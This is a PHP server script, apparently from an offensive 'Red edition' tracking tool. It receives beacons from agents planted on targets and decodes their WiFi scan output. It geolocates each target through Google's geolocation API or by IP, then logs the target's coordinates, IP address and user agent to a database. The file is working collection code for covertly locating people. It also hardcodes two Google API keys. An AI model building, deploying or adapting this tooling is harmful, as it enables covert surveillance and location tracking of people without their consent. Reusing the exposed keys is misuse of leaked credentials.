<?php include 'include/common.php'; ?>

<?php


// Red edition additions

function cust_decode($data, $method) {

	if($method=="base64"){
		return base64_decode($data);
	} else if ($method=="hex"){
		return hex2bin($data);
	}
	
}


// function declarations

function addtodb($target, $agent, $ip, $port, $useragent, $comment, $lat, $lng, $acc="Unknown") {
    global $db;
    $stamp = date("m/d/Y H:i:s");
    $prep = $db->prepare("INSERT INTO beacons VALUES (NULL, :stamp, :target, :agent, :ip, :port, :useragent, :comment, :lat, :lng, :acc)");
    $prep->execute(array(":stamp" => $stamp, ":target" => $target, ":agent" => $agent, ":ip" => $ip, ":port" => $port, ":useragent" => $useragent, ":comment" => $comment, ":lat" => $lat, ":lng" => $lng, ":acc" => $acc));
    logger(sprintf('[*] Target location identified as Lat: %s, Lng: %s', $lat, $lng));
}

function getJSON($url) {
    try {
        $jsondata = file_get_contents($url);
        logger(sprintf('[*] API URL used: %s', $url));
        logger(sprintf('[*] JSON object retrived:%s%s', "\n", $jsondata));
    } catch (Exception $e) {
        logger(sprintf('[!] Error retrieving JSON object: %s', $e));
        logger(sprintf('[!] Failed URL: %s', $url));
        $jsondata = NULL;
    }
    return $jsondata;
}

function getCoordsbyIP($ip) {
    logger('[*] Attempting to geolocate by IP.');
    $url = sprintf('http://uniapple.net/geoip/?ip=%s', $ip);
    $jsondata = getJSON($url);
    if (!is_null(json_decode($jsondata))) {
        $jsondecoded = json_decode($jsondata);
        $lat = $jsondecoded->latitude;
        $lng = $jsondecoded->longitude;
        return array($lat, $lng);
    } else {
        logger('[!] Invalid JSON object. Giving up on host.');
        return NULL;
    }
}

function parseMac($output) {
    $wifidata = array();
    preg_match_all("/([\S]+?)\s(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})\s(.?\d+)\s/", $output, $matches, PREG_SET_ORDER);
    if (empty($matches)) {
        return NULL;
    }
    foreach (range(0,count($matches)-1,1) as $i) {
        $wifidata[$i][] = $matches[$i][1];
        $wifidata[$i][] = $matches[$i][2];
        $wifidata[$i][] = $matches[$i][3];
    }
    return $wifidata;
}

function parseWin($output) {
    $aps = array();
    $wifidata = array();
    $lastssid = '';
    $items = preg_split('/\s/', $output, NULL, PREG_SPLIT_NO_EMPTY);
    foreach (range(0,count($items)-1,1) as $i) {
        if ($items[$i] == 'SSID') {
            $items[$i+3];
            $lastssid = $items[$i+3];
            $aps[] = $lastssid;
        } elseif ($items[$i] == 'BSSID') {
            if (intval($items[$i+1]) > 1) {
                $aps[] = $lastssid;
            }
            $aps[] = $items[$i+3];
        } elseif ($items[$i] == 'Signal') {
            $dBm = intval(substr($items[$i+2],0,-1)) - 100;
            $aps[] = strval($dBm);
        }
    }
    $wifidata = array_chunk($aps, 3);
    return $wifidata;
}

function parseNix($output) {
    $aps = array();
    $wifidata = array();
    $items = preg_split('/\s/', $output, NULL, PREG_SPLIT_NO_EMPTY);
    foreach (range(0,count($items)-1,1) as $i) {
        if ($items[$i] == 'Address:') {
            $aps[] = $items[$i+1];
        } elseif (preg_match('/^ESSID:/', $items[$i])) {
            $n = $i;
            $ssid = '';
            while (1) {
                $ssid .= ' '.$items[$n];
                if (preg_match('/"$/', $items[$n])) {
                    break;
                }
                $n += 1;
            }
            $aps[] = substr(trim($ssid),7,-1);
        } elseif (preg_match('/^level=/', $items[$i])) {
            $aps[] = substr($items[$i], 6);
        }
    }
    $wifidata = array_chunk($aps, 3);
    foreach (range(0,count($wifidata)-1,1) as $i) {
        array_splice($wifidata[$i], 0, count($wifidata[$i]), array($wifidata[$i][2], $wifidata[$i][0], $wifidata[$i][1]));
    }
    return $wifidata;
}

// accepts agent information
if (isset($_REQUEST['target'], $_REQUEST['agent'])) {

    // initialize parameters
    logger('[*] ==================================================');
    $target      = sanitize($_REQUEST['target']);
    $agent       = sanitize($_REQUEST['agent']);

    if (isset($_REQUEST['decode'])){
		$decode_method = sanitize($_REQUEST['decode']);
	} else {
		$decode_method = "base64";
	}

    // "comment" and "useragent" are html entity encoded rather than sanitized
    if (isset($_REQUEST['comment'])) {
        $comment = htmlspecialchars(cust_decode($_REQUEST['comment'], $decode_method));
    } else {
        $comment = '';
    }
    if ($_SERVER['QUERY_STRING'] !== '') {
        $querystr = $_SERVER['QUERY_STRING'];
    } else {
        $querystr = 'POST';
    }
    $ip          = $_SERVER['REMOTE_ADDR'];
    $port        = $_SERVER['REMOTE_PORT'];
    $useragent   = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);
    logger(sprintf('[*] Connection from %s @ %s:%s via %s', $target, $ip, $port, $agent));
    logger(sprintf('[*] Query String: %s', $querystr));
    logger(sprintf('[*] User-Agent: %s', $useragent));
    logger(sprintf('[*] Comment: %s', $comment));

    // handle tracking data
    if (isset($_REQUEST['lat'], $_REQUEST['lng'], $_REQUEST['acc'])) {
        $lat    = sanitize($_REQUEST['lat']);
        $lng    = sanitize($_REQUEST['lng']);
        $acc    = sanitize($_REQUEST['acc']);
        addtodb($target, $agent, $ip, $port, $useragent, $comment, $lat, $lng, $acc);
        respond('success');
        // respond terminates execution
    } elseif (isset($_REQUEST['os'], $_REQUEST['data'])) {
        $os     = sanitize($_REQUEST['os']);
        $data   = sanitize($_REQUEST['data']);
        $output = cust_decode($data, $decode_method);
        logger(sprintf('[*] Data received:%s%s', "\n", $data));
        logger(sprintf('[*] Decoded Data:%s%s', "\n", $output));
        if ($data) {
            if (preg_match('/^mac os x/', strtolower($os))) {
                $wifidata = parseMac($output);
            }
            elseif (preg_match('/^windows/', strtolower($os))) {
                $wifidata = parseWin($output);
            }
            elseif (preg_match('/^linux/', strtolower($os))) {
                $wifidata = parseNix($output);
            }
            else { $wifidata = NULL;
            }
            if (!empty($wifidata)) { // handle recognized data
                //$url = 'https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true&key=AIzaSyBGrmXVk94dypJR9yOK88iXtqYRc3eVG7s';
		$url = 'https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyCpjNE-0bpWRD3NlREOz9jo0WDiu2AsmRM';

		//Old API
		/*
                foreach ($wifidata as $ap) {
                    $node = '&wifi=mac:' . $ap[1] . '|ssid:' . urlencode($ap[0]) . '|ss:' . $ap[2];
                    $url .= $node;
                }
                $slicedurl = substr($url,0,1900);*/

		

                //$jsondata = getJSON($slicedurl);
		
		$data = array("wifiAccessPoints" => array());

		foreach ($wifidata as $ap) {
			$apar = array("macAddress"=>$ap[1],"signalStrength"=>$ap[2]);
			array_push($data['wifiAccessPoints'], $apar);
		}                

		$data_string = json_encode($data);                                                                                   
		logger($data_string);
                                                                                                                     
		$ch = curl_init($url);
		logger("0");
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		logger("1");
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json','Content-Length: ' . strlen($data_string)));          


		$result = curl_exec($ch);

		logger("RESULT: ". $result);

		if (!is_null(json_decode($result))) {
                    $jsondecoded = json_decode($result);
                    if ($jsondecoded->status != "ZERO_RESULTS") {
                        $acc = $jsondecoded->accuracy;
                        $lat = $jsondecoded->location->lat;
                        $lng = $jsondecoded->location->lng;
                        addtodb($target, $agent, $ip, $port, $useragent, $comment, $lat, $lng, $acc);
                        respond('success');                    
                    } else { // handle zero results returned from API
                        logger('[*] No results.');
                    }
                } else { // handle invalid data returned from API
                    logger('[!] Invalid JSON object.');
                }
            } else { // handle unrecognized data
                logger('[*] No parsable WLAN data received from the agent. Unrecognized target or wireless is disabled.');
            }
        } else { // handle blank data
            logger('[*] No data received from the agent.');
        }
    }
    
    // fall back
    if (!is_null($coords = getCoordsbyIP($ip))) {
        addtodb($target, $agent, $ip, $port, $useragent, $comment, $coords[0], $coords[1]);
        respond('success');
        // respond terminates execution
    }
}

respond('invalid request');

?>
